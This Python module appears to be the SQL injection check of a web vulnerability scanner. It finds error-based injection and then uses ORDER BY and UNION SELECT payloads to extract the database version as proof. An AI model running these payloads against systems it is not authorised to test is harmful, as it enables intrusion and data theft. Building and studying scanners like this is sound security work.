import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode

# Common SQL error messages from various database systems
SQL_ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*"),
    "Oracle": (r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error"),
}

ERROR_PAYLOAD = "'"

def _get_column_count(session, url, method, log_callback, params=None, data=None):
    log_callback(f"  -> Determining column count for {url}...")
    for i in range(1, 16): # Check for up to 15 columns
        payload = f"' ORDER BY {i}-- "
        test_params = {k: v + payload for k, v in (params or {}).items()}
        test_data = {k: v + payload for k, v in (data or {}).items()}
        try:
            if method == 'get':
                response = session.get(url, params=test_params, verify=False, timeout=5)
            else:
                response = session.post(url, data=test_data, verify=False, timeout=5)
            if re.search(r"Unknown column|ORDER BY clause is out of range", response.text, re.IGNORECASE):
                log_callback(f"  [+] Column count is {i-1}")
                return i - 1
        except requests.RequestException:
            continue
    log_callback("  [!] Could not determine column count.")
    return None

def _extract_data_with_union(session, url, method, column_count, log_callback, params=None, data=None):
    if not column_count: return None
    log_callback(f"  -> Attempting UNION-based extraction with {column_count} columns...")
    extraction_payloads = {"Version": "CONCAT('WVFE-START', @@version, 'WVFE-END')"}
    extracted_data = {}
    for key, extraction_payload in extraction_payloads.items():
        nulls = ['NULL'] * column_count
        nulls[0] = extraction_payload
        union_payload = f"' UNION SELECT {','.join(nulls)}-- "
        test_params = {k: v + union_payload for k, v in (params or {}).items()}
        test_data = {k: v + union_payload for k, v in (data or {}).items()}
        try:
            if method == 'get':
                response = session.get(url, params=test_params, verify=False, timeout=5)
            else:
                response = session.post(url, data=test_data, verify=False, timeout=5)
            match = re.search(r"WVFE-START(.*?)WVFE-END", response.text, re.DOTALL)
            if match:
                data_found = match.group(1).strip()
                log_callback(f"  [+] Extracted {key}: {data_found}")
                extracted_data[key] = data_found
        except requests.RequestException:
            continue
    return extracted_data if extracted_data else None

def check_sqli(targets, log_callback):
    found_vulnerabilities = []
    session = requests.Session()
    session.headers.update({'User-Agent': 'WVFE-Scanner/1.0'})

    for url in targets.get('links', set()):
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        if not params: continue

        log_callback(f"[*] Testing SQLi on URL: {url}")
        for param, values in params.items():
            test_params = params.copy()
            test_params[param] = values[0] + ERROR_PAYLOAD
            test_query = urlencode(test_params, doseq=True)
            test_url = parsed_url._replace(query=test_query).geturl()
            try:
                response = session.get(test_url, timeout=5, verify=False)
                for db, errors in SQL_ERRORS.items():
                    if any(re.search(e, response.text, re.IGNORECASE) for e in errors):
                        log_callback(f"[+] Found potential SQLi in {test_url} (param: {param})")
                        details = f"The parameter '{param}' seems to be vulnerable to error-based SQL injection."

                        column_count = _get_column_count(session, url, 'get', log_callback, params={param: values[0]})
                        extracted_data = _extract_data_with_union(session, url, 'get', column_count, log_callback, params={param: values[0]})
                        if extracted_data:
                            details += "\n--- Proof of Concept ---\n"
                            for key, value in extracted_data.items():
                                details += f"{key}: {value}\n"
                        vulnerability = {"type": f"SQL Injection ({db} Error)", "url": test_url, "payload": ERROR_PAYLOAD, "details": details}
                        found_vulnerabilities.append(vulnerability)
                        break
                else: continue
                break
            except requests.RequestException:
                pass
    return found_vulnerabilities
